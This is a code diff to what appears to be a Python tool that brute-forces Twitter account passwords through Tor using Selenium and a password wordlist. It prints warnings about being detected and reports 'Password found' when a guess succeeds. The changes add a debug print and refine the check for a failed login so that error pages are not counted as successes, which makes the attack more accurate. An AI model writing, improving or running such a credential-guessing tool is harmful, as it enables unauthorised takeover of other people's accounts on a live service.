@@ -127,7 +127,7 @@ def launch_tor(settings):
 def load_wlist(wlist):
     # open pass word list
     if not os.path.isfile(wlist):
-        print(R + ("   ERROR \t| Password list file was not found.") + W)
+        print(R + "   ERROR \t| Password list file was not found." + W)
         exit(0)
     with open(wlist) as words:
         # read all lines (== passwords)
@@ -183,6 +183,7 @@ def bruteforce(driver):
     WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
     # get current url
     url = driver.current_url
+    print(url)
 
     driver.get("http://ip.42.pl/raw")
     WebDriverWait(driver, 30).until(
@@ -195,7 +196,7 @@ def bruteforce(driver):
         print(R + (
             "   WARNING \t| Twitter probably found out your attacking this account.".format(USERNAME, password)) + W)
     # if it fails you land on /session/new or /login/check
-    elif "https://mobile.twitter.com/session/new" not in url:
+    elif "https://mobile.twitter.com/session/new" not in url and "https://mobile.twitter.com/login/error" not in url:
         # if thats not the case we found the password!
         print(G + ("   SUCCESS \t| Username: {} \t| Password found: {} \n".format(USERNAME, password)) + W)
 
